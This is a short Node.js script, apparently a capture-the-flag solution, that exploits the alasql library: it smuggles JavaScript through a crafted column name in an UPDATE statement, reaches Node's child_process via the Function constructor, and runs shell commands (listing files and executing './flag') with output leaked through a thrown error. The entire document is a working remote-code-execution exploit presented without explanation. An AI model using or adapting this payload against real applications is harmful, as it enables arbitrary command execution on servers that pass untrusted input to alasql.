const alasql = require('alasql');

const genPayload = (command) => `
(() => {
  const req = new Function('return this.process.mainModule.require')();
  const out = req('child_process').execSync(
    ${JSON.stringify(command)},
    { encoding: 'utf8' }
  );
  throw new Error(out.trim());
})()
`;

const sql =
  'CREATE TABLE i_am_a_table;' +
  'INSERT INTO i_am_a_table VALUES (1337);' +
  `UPDATE i_am_a_table SET [0'+${genPayload("sh -c 'pwd; ls -al; ./flag 2>&1'")}+']=42;`;

alasql(sql);
